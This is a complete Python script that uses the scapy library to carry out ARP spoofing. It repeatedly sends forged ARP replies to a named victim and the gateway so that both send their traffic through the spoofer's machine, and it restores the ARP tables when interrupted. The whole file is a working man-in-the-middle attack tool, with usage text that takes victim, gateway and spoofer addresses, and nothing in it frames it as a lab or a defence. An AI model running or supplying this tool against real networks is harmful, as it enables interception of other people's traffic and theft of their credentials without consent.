import scapy.all
import sys
import time

def getMAC(ip):
	# srp: Send and Receive Packets (thus srp) at layer 2
	# / is not division. It combines Ether and ARP
	ans, unans = scapy.all.srp(scapy.all.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.all.ARP(pdst=ip), timeout=5, retry=3)
	for s, r in ans:
		return r.sprintf('%Ether.src%')

def poisonARP(ipToARPSpoof, spooferMac, targetIP, targetMAC):
	# Send ARP to targetIP which has targetMAC that MAC address of ipToARPSpoof is spooferMAC
	arp = scapy.all.ARP(op=2, psrc=ipToARPSpoof, pdst=targetIP, hwsrc=spooferMAC, hwdst=targetMAC)
	scapy.all.send(arp)

def restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC):
	# Broad cast restore ARP to all subnet
	arp1 = scapy.all.ARP(op=2, psrc=gatewayIP, pdst=victimIP,  hwsrc=gatewayMAC, hwdst='ff:ff:ff:ff:ff:ff')
	arp2 = scapy.all.ARP(op=2, psrc=victimIP,  pdst=gatewayIP, hwsrc=victimMAC,  hwdst='ff:ff:ff:ff:ff:ff')
	scapy.all.send(arp1, count=3)
	scapy.all.send(arp2, count=3)

def printUsageAndExit():
	print("Usage: python {} <victim ip> <gateway ip> <spoofer ip>")
	print("Function: Use ARP spoofing to <victim ip> so that it believes the MAC address of <gateway ip> is that of <spoofer ip>")
	sys.exit(1)

if __name__ == '__main__':
	if len(sys.argv) != 4:
		printUsageAndExit()

	victimIP = sys.argv[1]
	gatewayIP = sys.argv[2]
	spooferIP = sys.argv[3]

	victimMAC = getMAC(victimIP)
	gatewayMAC = getMAC(gatewayIP)
	spooferMAC = getMAC(spooferIP)

	if None in [victimMAC, spooferMAC, gatewayMAC]:
		print('Could not find MAC Address')
		print('victimMAC',victimMAC)
		print('spooferMAC',spooferMAC)
		print('gatewayMAC',gatewayMAC)
		sys.exit(1)

	print('ARP Spoofing START -> VICTIM IP[{}]'.format(victimIP))
	print('[{}]: POISON ARP Table [{}] -> [{}]'.format(victimIP, gatewayMAC, spooferMAC))
	print('[{}]: POISON ARP Table [{}] -> [{}]'.format(gatewayIP, victimMAC, spooferMAC))

	try:
		while True:
			poisonARP(gatewayIP, spooferMAC, victimIP, victimMAC)
			poisonARP(victimIP, spooferMAC, gatewayIP, gatewayMAC)
			time.sleep(3)
	except KeyboardInterrupt:
		restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC)
		print('ARP Spoofing END -> RESTORED ARP Table')